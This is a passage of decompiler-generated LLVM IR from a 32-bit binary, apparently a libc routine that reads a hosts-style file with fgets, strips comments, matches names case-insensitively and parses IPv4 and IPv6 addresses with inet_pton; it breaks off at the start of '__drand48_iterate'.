dec_label_pc_8059eba:                             ; preds = %dec_label_pc_8059e61, %dec_label_pc_8059e8e
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8059e61 ], [ %storemerge3, %dec_label_pc_8059e8e ]
  %v1_8059eba = load i32, i32* %edx.global-to-local, align 4
  %v2_8059eba = add i32 %v1_8059eba, 16
  %v3_8059eba = inttoptr i32 %v2_8059eba to i32*
  store i32 %storemerge, i32* %v3_8059eba, align 4
  %v0_8059ebd = load i32, i32* @ebx, align 4
  %v1_8059ebd = add i32 %v0_8059ebd, 8
  %v1_8059ec0 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059ec0 = add i32 %v1_8059ec0, 4
  %v3_8059ec0 = inttoptr i32 %v2_8059ec0 to i32*
  store i32 %v1_8059ebd, i32* %v3_8059ec0, align 4
  store i32 %arg8, i32* %eax.global-to-local, align 4
  %v0_8059ec7 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059ec7 = inttoptr i32 %arg8 to i32*
  store i32 %v0_8059ec7, i32* %v2_8059ec7, align 4
  br label %dec_label_pc_805a025

dec_label_pc_8059ef5:                             ; preds = %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge, %dec_label_pc_8059e27
  %v1_8059ef9.pre-phi = phi i32* [ %.pre, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v1_8059dc6, %dec_label_pc_8059e27 ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v4_8059e37, %dec_label_pc_8059e27 ]
  %stack_var_-20.0.in = phi i32 [ %v1_8059daf, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v0_8059e33, %dec_label_pc_8059e27 ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v1_8059daf, %dec_label_pc_8059e27 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v0_8059e2f, %dec_label_pc_8059e27 ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v0_8059e1a, %dec_label_pc_8059e27 ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8059daa.dec_label_pc_8059ef5_crit_edge ], [ %v1_8059df3, %dec_label_pc_8059e27 ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8059ef9.pre-phi, align 4
  %v12_8059f83 = icmp eq i32 %arg4, 2
  %v2_8059fae = inttoptr i32 %arg2 to i8*
  %v12_8059fc1 = icmp eq i32 %arg3, 2
  %v12_8059fe3 = icmp eq i32 %arg3, 10
  %v1_8059f8d = icmp eq i1 %v12_8059f83, false
  %v1_8059fc6 = icmp eq i1 %v12_8059fc1, false
  %v1_8059fe8 = icmp eq i1 %v12_8059fe3, false
  br label %dec_label_pc_805a00b.outer

dec_label_pc_805a00b.outer:                       ; preds = %dec_label_pc_8059fe3, %dec_label_pc_8059fea, %dec_label_pc_8059fc8, %dec_label_pc_8059ef5
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8059ef5 ], [ 2, %dec_label_pc_8059fc8 ], [ 2, %dec_label_pc_8059fea ], [ 2, %dec_label_pc_8059fe3 ]
  br label %dec_label_pc_805a00b

dec_label_pc_8059f0c:                             ; preds = %dec_label_pc_805a00b
  %v5_8059f14 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35, i32 %v3_805a015, i32 %v3_805a015)
  store i32 %v5_8059f14, i32* @eax, align 4
  %v1_8059f1c = icmp eq i32 %v5_8059f14, 0
  br i1 %v1_8059f1c, label %dec_label_pc_8059f23, label %dec_label_pc_8059f20

dec_label_pc_8059f20:                             ; preds = %dec_label_pc_8059f0c
  %v1_8059f20 = inttoptr i32 %v5_8059f14 to i8*
  store i8 0, i8* %v1_8059f20, align 1
  br label %dec_label_pc_8059f23

dec_label_pc_8059f23:                             ; preds = %dec_label_pc_8059f0c, %dec_label_pc_8059f20
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8059f6334 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8059f6335 = icmp eq i8 %v2_8059f6334, 0
  %v1_8059f6641 = icmp eq i1 %v3_8059f6335, false
  br i1 %v1_8059f6641, label %dec_label_pc_8059f2f.preheader.preheader, label %dec_label_pc_8059f68

dec_label_pc_8059f2f.preheader.preheader:         ; preds = %dec_label_pc_8059f23
  %v4_8059f2f98.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8059f2f.preheader

dec_label_pc_8059f2b:                             ; preds = %dec_label_pc_8059f35
  store i8 0, i8* %v1_8059f2f104, align 1
  %v0_8059f2e = load i32, i32* @ecx, align 4
  %v1_8059f2e = add i32 %v0_8059f2e, 1
  store i32 %v1_8059f2e, i32* @ecx, align 4
  %v1_8059f2f = inttoptr i32 %v1_8059f2e to i8*
  %v2_8059f2f = load i8, i8* %v1_8059f2f, align 1
  %v3_8059f2f = zext i8 %v2_8059f2f to i32
  %v4_8059f2f = load i32, i32* %eax.global-to-local, align 4
  %v5_8059f2f = and i32 %v4_8059f2f, -256
  %v6_8059f2f = or i32 %v5_8059f2f, %v3_8059f2f
  store i32 %v6_8059f2f, i32* @eax, align 4
  %v4_8059f31 = icmp eq i8 %v2_8059f2f, 0
  br i1 %v4_8059f31, label %dec_label_pc_8059f2f.dec_label_pc_8059f68.loopexit_crit_edge, label %dec_label_pc_8059f35

dec_label_pc_8059f35:                             ; preds = %dec_label_pc_8059f2f.preheader, %dec_label_pc_8059f2b
  %v2_8059f2f105 = phi i8 [ %v2_8059f2f, %dec_label_pc_8059f2b ], [ %v2_8059f2f96, %dec_label_pc_8059f2f.preheader ]
  %v1_8059f2f104 = phi i8* [ %v1_8059f2f, %dec_label_pc_8059f2b ], [ %v1_8059f2f95, %dec_label_pc_8059f2f.preheader ]
  %v0_8059f2b103 = phi i32 [ %v1_8059f2e, %dec_label_pc_8059f2b ], [ %v0_8059f2f49, %dec_label_pc_8059f2f.preheader ]
  %v2_8059f35 = sext i8 %v2_8059f2f105 to i32
  store i32 %v2_8059f35, i32* @edx, align 4
  %v0_8059f38 = load i32, i32* @global_var_8062dc0, align 64
  store i32 %v0_8059f38, i32* %eax.global-to-local, align 4
  %v2_8059f3d = mul nsw i32 %v2_8059f35, 2
  %v3_8059f3d = add i32 %v0_8059f38, %v2_8059f3d
  %v4_8059f3d = inttoptr i32 %v3_8059f3d to i8*
  %v5_8059f3d = load i8, i8* %v4_8059f3d, align 1
  %v6_8059f3d = and i8 %v5_8059f3d, 32
  %v7_8059f3d = icmp eq i8 %v6_8059f3d, 0
  %v1_8059f41 = icmp eq i1 %v7_8059f3d, false
  br i1 %v1_8059f41, label %dec_label_pc_8059f2b, label %dec_label_pc_8059f43

dec_label_pc_8059f43:                             ; preds = %dec_label_pc_8059f35
  %v0_8059f43 = load i32, i32* @edi, align 4
  %v1_8059f43 = add i32 %v0_8059f43, -6
  %v6_8059f43 = sub i32 5, %v0_8059f43
  %v7_8059f43 = and i32 %v6_8059f43, %v0_8059f43
  %v8_8059f43 = icmp slt i32 %v7_8059f43, 0
  %v9_8059f43 = icmp eq i32 %v1_8059f43, 0
  %v10_8059f43 = icmp slt i32 %v1_8059f43, 0
  %v3_8059f46 = icmp eq i1 %v10_8059f43, %v8_8059f43
  %v4_8059f46 = icmp eq i1 %v9_8059f43, false
  %v5_8059f46 = and i1 %v4_8059f46, %v3_8059f46
  br i1 %v5_8059f46, label %dec_label_pc_8059f4f.preheader, label %dec_label_pc_8059f48

dec_label_pc_8059f48:                             ; preds = %dec_label_pc_8059f43
  %v1_8059f48 = load i32, i32* @ebx, align 4
  %v3_8059f48 = mul i32 %v0_8059f43, 4
  %v4_8059f48 = add i32 %v1_8059f48, %v3_8059f48
  %v5_8059f48 = inttoptr i32 %v4_8059f48 to i32*
  store i32 %v0_8059f2b103, i32* %v5_8059f48, align 4
  %v0_8059f4b = load i32, i32* @edi, align 4
  %v1_8059f4b = add i32 %v0_8059f4b, 1
  store i32 %v1_8059f4b, i32* @edi, align 4
  %v0_8059f4f.pre.pre = load i32, i32* @ecx, align 4
  %v4_8059f4f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059f4f.preheader

dec_label_pc_8059f4f.preheader:                   ; preds = %dec_label_pc_8059f48, %dec_label_pc_8059f43
  %v4_8059f4f.pre = phi i32 [ %v4_8059f4f.pre.pre, %dec_label_pc_8059f48 ], [ %v0_8059f38, %dec_label_pc_8059f43 ]
  %v0_8059f4f.pre = phi i32 [ %v0_8059f4f.pre.pre, %dec_label_pc_8059f48 ], [ %v0_8059f2b103, %dec_label_pc_8059f43 ]
  %v0_8059f6854 = phi i32 [ %v1_8059f4b, %dec_label_pc_8059f48 ], [ %v0_8059f43, %dec_label_pc_8059f43 ]
  %v1_8059f4f106 = inttoptr i32 %v0_8059f4f.pre to i8*
  %v2_8059f4f107 = load i8, i8* %v1_8059f4f106, align 1
  %v3_8059f4f108 = zext i8 %v2_8059f4f107 to i32
  %v5_8059f4f109 = and i32 %v4_8059f4f.pre, -256
  %v6_8059f4f110 = or i32 %v3_8059f4f108, %v5_8059f4f109
  store i32 %v6_8059f4f110, i32* @eax, align 4
  %v4_8059f51111 = icmp eq i8 %v2_8059f4f107, 0
  br i1 %v4_8059f51111, label %dec_label_pc_8059f63.loopexit, label %dec_label_pc_8059f55.lr.ph

dec_label_pc_8059f55.lr.ph:                       ; preds = %dec_label_pc_8059f4f.preheader
  %v0_8059f58.pre = load i32, i32* @global_var_8062dc0, align 64
  br label %dec_label_pc_8059f55

dec_label_pc_8059f4e:                             ; preds = %dec_label_pc_8059f55
  %v1_8059f4e = add i32 %v0_8059f63113, 1
  store i32 %v1_8059f4e, i32* @ecx, align 4
  %v1_8059f4f = inttoptr i32 %v1_8059f4e to i8*
  %v2_8059f4f = load i8, i8* %v1_8059f4f, align 1
  %v3_8059f4f = zext i8 %v2_8059f4f to i32
  %v5_8059f4f = and i32 %v0_8059f58.pre, -256
  %v6_8059f4f = or i32 %v3_8059f4f, %v5_8059f4f
  store i32 %v6_8059f4f, i32* @eax, align 4
  %v4_8059f51 = icmp eq i8 %v2_8059f4f, 0
  br i1 %v4_8059f51, label %dec_label_pc_8059f63.loopexit, label %dec_label_pc_8059f55

dec_label_pc_8059f55:                             ; preds = %dec_label_pc_8059f55.lr.ph, %dec_label_pc_8059f4e
  %v2_8059f4f115 = phi i8 [ %v2_8059f4f107, %dec_label_pc_8059f55.lr.ph ], [ %v2_8059f4f, %dec_label_pc_8059f4e ]
  %v1_8059f4f114 = phi i8* [ %v1_8059f4f106, %dec_label_pc_8059f55.lr.ph ], [ %v1_8059f4f, %dec_label_pc_8059f4e ]
  %v0_8059f63113 = phi i32 [ %v0_8059f4f.pre, %dec_label_pc_8059f55.lr.ph ], [ %v1_8059f4e, %dec_label_pc_8059f4e ]
  %v2_8059f55 = sext i8 %v2_8059f4f115 to i32
  store i32 %v2_8059f55, i32* @edx, align 4
  store i32 %v0_8059f58.pre, i32* @eax, align 4
  %v2_8059f5d = mul nsw i32 %v2_8059f55, 2
  %v3_8059f5d = add i32 %v0_8059f58.pre, %v2_8059f5d
  %v4_8059f5d = inttoptr i32 %v3_8059f5d to i8*
  %v5_8059f5d = load i8, i8* %v4_8059f5d, align 1
  %v6_8059f5d = and i8 %v5_8059f5d, 32
  %v7_8059f5d = icmp eq i8 %v6_8059f5d, 0
  br i1 %v7_8059f5d, label %dec_label_pc_8059f4e, label %dec_label_pc_8059f63.loopexit

dec_label_pc_8059f63.loopexit:                    ; preds = %dec_label_pc_8059f55, %dec_label_pc_8059f4e, %dec_label_pc_8059f4f.preheader
  %v4_8059f2f98139 = phi i32 [ %v6_8059f4f110, %dec_label_pc_8059f4f.preheader ], [ %v6_8059f4f, %dec_label_pc_8059f4e ], [ %v0_8059f58.pre, %dec_label_pc_8059f55 ]
  %v0_8059f63.lcssa = phi i32 [ %v0_8059f4f.pre, %dec_label_pc_8059f4f.preheader ], [ %v1_8059f4e, %dec_label_pc_8059f4e ], [ %v0_8059f63113, %dec_label_pc_8059f55 ]
  %v1_8059f4f.lcssa = phi i8* [ %v1_8059f4f106, %dec_label_pc_8059f4f.preheader ], [ %v1_8059f4f, %dec_label_pc_8059f4e ], [ %v1_8059f4f114, %dec_label_pc_8059f55 ]
  %v2_8059f63 = load i8, i8* %v1_8059f4f.lcssa, align 1
  %v3_8059f63 = icmp eq i8 %v2_8059f63, 0
  %v1_8059f66 = icmp eq i1 %v3_8059f63, false
  br i1 %v1_8059f66, label %dec_label_pc_8059f2f.preheader, label %dec_label_pc_8059f68

dec_label_pc_8059f2f.preheader:                   ; preds = %dec_label_pc_8059f2f.preheader.preheader, %dec_label_pc_8059f63.loopexit
  %v0_8059f68.pre142 = phi i32 [ %v0_8059f6854, %dec_label_pc_8059f63.loopexit ], [ 0, %dec_label_pc_8059f2f.preheader.preheader ]
  %v4_8059f2f98 = phi i32 [ %v4_8059f2f98139, %dec_label_pc_8059f63.loopexit ], [ %v4_8059f2f98.pre, %dec_label_pc_8059f2f.preheader.preheader ]
  %v0_8059f2f49 = phi i32 [ %v0_8059f63.lcssa, %dec_label_pc_8059f63.loopexit ], [ %stack_var_-20.0.in, %dec_label_pc_8059f2f.preheader.preheader ]
  %v1_8059f2f95 = inttoptr i32 %v0_8059f2f49 to i8*
  %v2_8059f2f96 = load i8, i8* %v1_8059f2f95, align 1
  %v3_8059f2f97 = zext i8 %v2_8059f2f96 to i32
  %v5_8059f2f99 = and i32 %v4_8059f2f98, -256
  %v6_8059f2f100 = or i32 %v5_8059f2f99, %v3_8059f2f97
  store i32 %v6_8059f2f100, i32* @eax, align 4
  %v4_8059f31101 = icmp eq i8 %v2_8059f2f96, 0
  br i1 %v4_8059f31101, label %dec_label_pc_8059f68, label %dec_label_pc_8059f35

dec_label_pc_8059f2f.dec_label_pc_8059f68.loopexit_crit_edge: ; preds = %dec_label_pc_8059f2b
  %v0_8059f68.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8059f68

dec_label_pc_8059f68:                             ; preds = %dec_label_pc_8059f63.loopexit, %dec_label_pc_8059f2f.dec_label_pc_8059f68.loopexit_crit_edge, %dec_label_pc_8059f2f.preheader, %dec_label_pc_8059f23
  %v1_8059f6b = phi i32 [ 0, %dec_label_pc_8059f23 ], [ %v0_8059f68.pre.pre, %dec_label_pc_8059f2f.dec_label_pc_8059f68.loopexit_crit_edge ], [ %v0_8059f68.pre142, %dec_label_pc_8059f2f.preheader ], [ %v0_8059f6854, %dec_label_pc_8059f63.loopexit ]
  %v0_8059f6b = load i32, i32* @ebx, align 4
  %v2_8059f6b = mul i32 %v1_8059f6b, 4
  %v3_8059f6b = add i32 %v0_8059f6b, %v2_8059f6b
  %v4_8059f6b = inttoptr i32 %v3_8059f6b to i32*
  store i32 0, i32* %v4_8059f6b, align 4
  %v7_8059f72 = icmp sgt i32 %v1_8059f6b, 1
  br i1 %v7_8059f72, label %dec_label_pc_8059f78, label %dec_label_pc_805a00b

dec_label_pc_8059f78:                             ; preds = %dec_label_pc_8059f68
  br i1 %v12_8059daa, label %dec_label_pc_805a045, label %dec_label_pc_8059f83

dec_label_pc_8059f83:                             ; preds = %dec_label_pc_8059f78
  store i32 1, i32* @esi, align 4
  br i1 %v1_8059f8d, label %dec_label_pc_8059fbb.preheader, label %dec_label_pc_8059f8f

dec_label_pc_8059fbb.preheader:                   ; preds = %dec_label_pc_8059f83
  %v1_8059fbb119 = load i32, i32* @edi, align 4
  %v5_8059fbd128 = icmp sgt i32 %v1_8059fbb119, 1
  br i1 %v5_8059fbd128, label %dec_label_pc_8059fa5.lr.ph, label %dec_label_pc_805a00b

dec_label_pc_8059fa5.lr.ph:                       ; preds = %dec_label_pc_8059fbb.preheader
  br label %dec_label_pc_8059fa5

dec_label_pc_8059f8f:                             ; preds = %dec_label_pc_8059f83
  %v0_8059f8f = load i32, i32* @eax, align 4
  %v0_8059f91 = load i32, i32* @ebx, align 4
  %v1_8059f91 = inttoptr i32 %v0_8059f91 to i32*
  %v2_8059f91 = load i32, i32* %v1_8059f91, align 4
  %v5_8059f97 = call i32 @__GI_strcoll(i8* %v2_8059fae, i32 %v2_8059f91, i32 %v0_8059f8f, i32 %v0_8059f8f)
  store i32 %v5_8059f97, i32* %eax.global-to-local, align 4
  %v1_8059f9f = icmp eq i32 %v5_8059f97, 0
  %v1_8059fa1 = icmp eq i1 %v1_8059f9f, false
  br i1 %v1_8059fa1, label %dec_label_pc_805a00b, label %dec_label_pc_8059fc1

dec_label_pc_8059fa5:                             ; preds = %dec_label_pc_8059fa5.lr.ph, %dec_label_pc_8059fba
  %v1_8059fa7129 = phi i32 [ 1, %dec_label_pc_8059fa5.lr.ph ], [ %v1_8059fba, %dec_label_pc_8059fba ]
  %v0_8059fa7 = load i32, i32* @ebx, align 4
  %v2_8059fa7 = mul i32 %v1_8059fa7129, 4
  %v3_8059fa7 = add i32 %v0_8059fa7, %v2_8059fa7
  %v4_8059fa7 = inttoptr i32 %v3_8059fa7 to i32*
  %v5_8059fa7 = load i32, i32* %v4_8059fa7, align 4
  %v3_8059fae = call i32 @__GI_strcasecmp(i8* %v2_8059fae, i32 %v5_8059fa7)
  store i32 %v3_8059fae, i32* %eax.global-to-local, align 4
  %v1_8059fb6 = icmp eq i32 %v3_8059fae, 0
  br i1 %v1_8059fb6, label %dec_label_pc_8059fc1, label %dec_label_pc_8059fba

dec_label_pc_8059fba:                             ; preds = %dec_label_pc_8059fa5
  %v0_8059fba = load i32, i32* @esi, align 4
  %v1_8059fba = add i32 %v0_8059fba, 1
  store i32 %v1_8059fba, i32* @esi, align 4
  %v1_8059fbb = load i32, i32* @edi, align 4
  %v5_8059fbd = icmp slt i32 %v1_8059fba, %v1_8059fbb
  br i1 %v5_8059fbd, label %dec_label_pc_8059fa5, label %dec_label_pc_805a00b

dec_label_pc_8059fc1:                             ; preds = %dec_label_pc_8059f8f, %dec_label_pc_8059fa5
  br i1 %v1_8059fc6, label %dec_label_pc_8059fe3, label %dec_label_pc_8059fc8

dec_label_pc_8059fc8:                             ; preds = %dec_label_pc_8059fc1
  %v0_8059fc8 = load i32, i32* @esi, align 4
  %v3_8059fc9 = load i8*, i8** %stack_var_-44, align 4
  %v4_8059fc9 = ptrtoint i8* %v3_8059fc9 to i32
  %v0_8059fcd = load i32, i32* @ebx, align 4
  %v1_8059fcd = inttoptr i32 %v0_8059fcd to i32*
  %v2_8059fcd = load i32, i32* %v1_8059fcd, align 4
  %v4_8059fd1 = inttoptr i32 %v2_8059fcd to i8*
  %v5_8059fd1 = call i32 @inet_pton(i32 2, i8* %v4_8059fd1, i32 %v4_8059fc9, i32 %v0_8059fc8)
  store i32 %v5_8059fd1, i32* %eax.global-to-local, align 4
  %tmp85 = icmp slt i32 %v5_8059fd1, 1
  %tmp86 = icmp eq i1 %tmp85, false
  br i1 %tmp86, label %dec_label_pc_8059e61, label %dec_label_pc_805a00b.outer

dec_label_pc_8059fe3:                             ; preds = %dec_label_pc_8059fc1
  br i1 %v1_8059fe8, label %dec_label_pc_805a00b.outer, label %dec_label_pc_8059fea

dec_label_pc_8059fea:                             ; preds = %dec_label_pc_8059fe3
  %v0_8059fea = load i32, i32* @ecx, align 4
  %v0_8059fef = load i32, i32* @ebx, align 4
  %v1_8059fef = inttoptr i32 %v0_8059fef to i32*
  %v2_8059fef = load i32, i32* %v1_8059fef, align 4
  %v4_8059ff3 = inttoptr i32 %v2_8059fef to i8*
  %v5_8059ff3 = call i32 @inet_pton(i32 10, i8* %v4_8059ff3, i32 %stack_var_-36.0, i32 %v0_8059fea)
  store i32 %v5_8059ff3, i32* %eax.global-to-local, align 4
  %tmp87 = icmp slt i32 %v5_8059ff3, 1
  %tmp88 = icmp eq i1 %tmp87, false
  br i1 %tmp88, label %dec_label_pc_8059e8e, label %dec_label_pc_805a00b.outer

dec_label_pc_805a00b:                             ; preds = %dec_label_pc_8059fbb.preheader, %dec_label_pc_8059fba, %dec_label_pc_8059f68, %dec_label_pc_8059f8f, %dec_label_pc_805a00b.outer
  %v0_805a00b = load i32, i32* @edx, align 4
  %v3_805a015 = call i32 @fgets(i32 %stack_var_-20.0.in, i32 %stack_var_4.0, i32 %v0_805a00b)
  store i32 %v3_805a015, i32* %eax.global-to-local, align 4
  %v1_805a01d = icmp eq i32 %v3_805a015, 0
  %v1_805a01f = icmp eq i1 %v1_805a01d, false
  br i1 %v1_805a01f, label %dec_label_pc_8059f0c, label %dec_label_pc_805a025

dec_label_pc_805a025:                             ; preds = %dec_label_pc_805a00b, %dec_label_pc_8059eba
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_8059eba ], [ %stack_var_-28.0.ph, %dec_label_pc_805a00b ]
  br i1 %v12_8059daa, label %dec_label_pc_805a045, label %dec_label_pc_805a02c

dec_label_pc_805a02c:                             ; preds = %dec_label_pc_805a025
  %v1_805a033 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_805a033 = call i32 @__GI_fclose(i16* %v1_805a033)
  store i32 %v2_805a033, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805a045

dec_label_pc_805a045:                             ; preds = %dec_label_pc_8059f78, %dec_label_pc_8059d95, %dec_label_pc_8059da1, %dec_label_pc_8059dbf, %dec_label_pc_8059dd2, %dec_label_pc_8059dde, %dec_label_pc_8059de7, %dec_label_pc_8059e11, %dec_label_pc_805a025, %dec_label_pc_805a02c, %dec_label_pc_8059e47
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_805a025 ], [ %stack_var_-28.1, %dec_label_pc_805a02c ], [ %v2_8059e56, %dec_label_pc_8059e47 ], [ 34, %dec_label_pc_8059e11 ], [ 34, %dec_label_pc_8059de7 ], [ 34, %dec_label_pc_8059dde ], [ 34, %dec_label_pc_8059dd2 ], [ 34, %dec_label_pc_8059dbf ], [ 34, %dec_label_pc_8059da1 ], [ 34, %dec_label_pc_8059d95 ], [ %stack_var_-28.0.ph, %dec_label_pc_8059f78 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_8059d80, i32* @ebx, align 4
  store i32 %v0_8059d7f, i32* @esi, align 4
  store i32 %v0_8059d7e, i32* @edi, align 4
  store i32 %v0_8059d7d, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v3_805a015, { 2, 3, 1, 0 }
  uselistorder i32 %v1_8059fba, { 0, 2, 1 }
  uselistorder i32 %v1_8059f6b, { 1, 0 }
  uselistorder i8 %v2_8059f2f96, { 1, 2, 0 }
  uselistorder i8* %v1_8059f2f95, { 1, 0 }
  uselistorder i32 %v0_8059f2f49, { 1, 0 }
  uselistorder i32 %v2_8059f55, { 1, 0 }
  uselistorder i32 %v1_8059f4e, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8059f58.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v1_8059f43, { 1, 0 }
  uselistorder i32 %v0_8059f43, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_8059f35, { 1, 0 }
  uselistorder i8* %v2_8059fae, { 1, 0 }
  uselistorder i32 %storemerge3, { 1, 2, 0 }
  uselistorder i32 %stack_var_4.0, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 1, 2, 0 }
  uselistorder i32 %stack_var_-20.0.in, { 2, 0, 1, 3 }
  uselistorder i32 %v0_8059df3, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8059dd2, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8059daf, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8059db6, { 1, 0 }
  uselistorder i32 %v1_8059d90, { 4, 3, 2, 1, 0 }
  uselistorder i8** %stack_var_-44, { 2, 0, 1 }
  uselistorder i32 %tmp60, { 0, 3, 1, 2 }
  uselistorder i32* %edx.global-to-local, { 4, 5, 6, 0, 1, 2, 3, 7, 8, 9, 10, 11, 13, 12, 14 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 15, 4, 9, 10, 11, 12, 14, 13, 5, 2, 3, 6, 7, 8, 16, 19, 17, 18, 20, 21, 22, 23, 24 }
  uselistorder i32 34, { 3, 4, 5, 6, 7, 8, 9, 0, 12, 13, 15, 16, 10, 1, 2, 17, 18, 19, 14, 11 }
  uselistorder i32 (i16*)* @__GI_fclose, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 3, 2, 4, 1, 0 }
  uselistorder i32 (i8*, i32)* @__GI_strcasecmp, { 4, 6, 7, 0, 1, 2, 3, 5 }
  uselistorder i32 (i8*, i32, i32, i32)* @__GI_strcoll, { 1, 2, 3, 4, 0 }
  uselistorder i32 -6, { 1, 0, 2 }
  uselistorder i8 32, { 24, 25, 26, 27, 28, 15, 14, 32, 0, 12, 33, 21, 22, 23, 13, 29, 34, 35, 30, 31, 1, 2, 3, 4, 5, 6, 9, 16, 8, 17, 7, 18, 10, 19, 11, 20 }
  uselistorder i32* @global_var_8062dc0, { 0, 4, 2, 5, 1, 3, 6, 7 }
  uselistorder i32 35, { 4, 6, 0, 1, 2, 7, 3, 5 }
  uselistorder i32 (i32)* @__errno_location, { 63, 120, 119, 118, 62, 49, 47, 57, 45, 44, 34, 33, 32, 31, 115, 60, 125, 124, 123, 122, 1, 117, 43, 52, 26, 25, 24, 75, 74, 116, 35, 30, 23, 22, 68, 67, 66, 65, 114, 113, 112, 27, 29, 28, 96, 14, 89, 59, 51, 42, 50, 2, 55, 54, 72, 71, 69, 17, 70, 64, 13, 5, 10, 95, 58, 12, 38, 103, 102, 104, 37, 56, 111, 110, 61, 73, 109, 8, 11, 18, 108, 106, 46, 9, 3, 41, 94, 36, 48, 4, 107, 53, 0, 21, 7, 6, 105, 16, 15, 101, 100, 99, 93, 98, 97, 20, 19, 92, 91, 90, 88, 87, 86, 85, 84, 83, 82, 81, 80, 126, 40, 121, 39, 79, 78, 77, 76 }
  uselistorder i32 80, { 0, 7, 14, 5, 8, 9, 10, 11, 12, 13, 1, 2, 4, 6, 3 }
  uselistorder i32 56, { 8, 22, 20, 21, 9, 0, 10, 11, 12, 13, 3, 23, 4, 2, 15, 14, 16, 7, 1, 24, 17, 18, 19, 6, 25, 26, 5 }
  uselistorder i32 44, { 18, 19, 20, 13, 0, 24, 25, 26, 21, 14, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12, 2, 30, 32, 31, 27, 28, 29, 22, 23, 17, 15, 16, 33, 34, 1 }
  uselistorder i32 36, { 17, 18, 19, 20, 21, 22, 23, 24, 25, 1, 26, 2, 3, 27, 14, 15, 12, 34, 8, 9, 28, 7, 0, 6, 30, 31, 32, 33, 13, 16, 5, 10, 4, 11, 29 }
  uselistorder i32 -44, { 1, 0 }
  uselistorder i32 48, { 17, 18, 19, 13, 14, 15, 0, 7, 4, 1, 9, 5, 6, 21, 22, 23, 24, 3, 2, 20, 25, 26, 16, 10, 11, 12, 8 }
  uselistorder i32 -48, { 1, 2, 3, 0, 4 }
  uselistorder i32 -32, { 10, 8, 0, 2, 6, 1, 3, 9, 5, 7, 4 }
  uselistorder i32 32, { 94, 0, 95, 96, 35, 38, 119, 39, 117, 44, 120, 121, 97, 36, 98, 99, 100, 45, 46, 71, 72, 73, 75, 5, 4, 7, 6, 41, 74, 8, 76, 77, 78, 79, 80, 81, 82, 83, 59, 60, 61, 62, 63, 64, 3, 9, 65, 66, 67, 118, 51, 52, 106, 128, 40, 50, 92, 93, 122, 11, 10, 12, 13, 47, 14, 15, 125, 16, 17, 18, 19, 20, 1, 101, 102, 103, 107, 108, 2, 109, 110, 111, 112, 113, 114, 115, 21, 116, 48, 123, 124, 104, 22, 23, 24, 25, 26, 27, 28, 105, 84, 85, 86, 87, 68, 90, 126, 127, 91, 88, 89, 69, 70, 53, 37, 54, 55, 56, 57, 58, 29, 30, 32, 31, 42, 43, 34, 33, 49 }
  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_805a045, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805a00b, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_8059fc1, { 1, 0 }
  uselistorder label %dec_label_pc_8059fa5, { 1, 0 }
  uselistorder label %dec_label_pc_8059f68, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_8059f2f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8059f55, { 1, 0 }
  uselistorder label %dec_label_pc_8059f23, { 1, 0 }
  uselistorder label %dec_label_pc_805a00b.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8059ef5, { 1, 0 }
  uselistorder label %dec_label_pc_8059eba, { 1, 0 }
  uselistorder label %dec_label_pc_8059e11, { 1, 0 }
  uselistorder label %dec_label_pc_8059da1, { 1, 0 }
}

define i32 @__drand48_iterate(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
